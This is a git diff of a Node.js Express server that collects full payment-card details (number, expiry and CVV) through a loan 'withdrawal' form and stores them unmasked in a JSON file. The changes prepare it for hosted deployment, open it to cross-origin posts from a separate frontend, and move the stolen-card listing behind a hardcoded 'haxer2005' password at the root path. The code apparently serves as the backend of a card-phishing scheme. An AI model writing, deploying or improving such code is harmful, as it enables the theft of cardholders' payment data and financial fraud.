@@ -2,12 +2,18 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const app = express();
-const port = 3000;
+const port = process.env.PORT || 3000; // For Render compatibility
 
 // Middleware to parse JSON bodies and URL-encoded forms
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, '../'))); // Serve front-end files
+
+// Add CORS headers to allow requests from the frontend
+app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+    next();
+});
 
 // File to store withdrawal data
 const withdrawalsFile = path.join(__dirname, 'withdrawals.json');
@@ -27,9 +33,9 @@ app.post('/api/withdraw', (req, res) => {
 
     const withdrawal = {
         cardholderName,
-        cardNumber, // Full details, no masking
+        cardNumber, // No masking
         expiry,
-        cvv,    // Full details, no masking
+        cvv,    // No masking
         loanAmount,
         timestamp: new Date().toISOString()
     };
@@ -53,8 +59,8 @@ app.post('/api/withdraw', (req, res) => {
     });
 });
 
-// GET endpoint for withdrawals with password protection
-app.get('/withdrawals', (req, res) => {
+// GET endpoint for root (/) with password protection
+app.get('/', (req, res) => {
     // If password isn’t provided yet, show a form
     if (!req.query.password) {
         res.send(`
@@ -75,7 +81,7 @@ app.get('/withdrawals', (req, res) => {
             <body>
                 <div class="container">
                     <h2>Enter Password</h2>
-                    <form action="/withdrawals" method="GET">
+                    <form action="/" method="GET">
                         <input type="password" name="password" placeholder="Password" required>
                         <br>
                         <button type="submit">Submit</button>
@@ -86,7 +92,7 @@ app.get('/withdrawals', (req, res) => {
         `);
     } else {
         // Check password
-        if (req.query.password !== 'hacker2005') {
+        if (req.query.password !== 'haxer2005') {
             return res.send(`
                 <!DOCTYPE html>
                 <html lang="en">
@@ -103,7 +109,7 @@ app.get('/withdrawals', (req, res) => {
                     <div class="container">
                         <h2>Wrong Password</h2>
                         <p>Try again.</p>
-                        <a href="/withdrawals">Back</a>
+                        <a href="/">Back</a>
                     </div>
                 </body>
                 </html>
@@ -173,5 +179,5 @@ app.get('/withdrawals', (req, res) => {
 
 // Start server
 app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}`);
+    console.log(`Server running on port ${port}`);
 });
